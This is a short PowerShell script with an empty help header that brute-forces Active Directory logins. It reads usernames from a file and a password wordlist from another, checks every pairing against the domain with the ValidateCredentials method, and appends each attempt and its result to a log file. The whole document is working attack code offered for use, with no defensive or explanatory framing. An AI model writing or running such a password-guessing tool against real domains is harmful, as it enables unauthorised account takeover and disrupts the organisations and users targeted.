<#
.SYNOPSIS
.DESCRIPTION

.NOTES

#>

$userfile = ".\users.txt"
$passfile = ".\wordlist_of_passwords.txt"
$outfile = ".\output.out"


function Test-ADCredential {
    [CmdletBinding()]
    Param
    (
        [string]$UserName,
        [string]$Password
    )
    if (!($UserName) -or !($Password)) {
        Write-Warning 'Test-ADCredential: Please specify both user name and password'
    } else {
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('domain')
        $DS.ValidateCredentials($UserName, $Password)
    }
}


$path = $userfile
$csv = Import-Csv -path $path

foreach($line in $csv)
{ 
    $properties = $line | Get-Member -MemberType Properties
    for($i=0; $i -lt $properties.Count;$i++)
    {
        $column = $properties[$i]
        $columnvalue = $line | Select -ExpandProperty $column.Name

        $pwds = Get-Content $passfile
        foreach($passw in $pwds)
        {
            $log = "Testing $columnvalue : $passw"
	        Echo $log|out-file -append $outfile
    
	        Test-ADCredential -UserName $columnvalue -Password $passw |out-file -append $outfile
        }

    }
} 
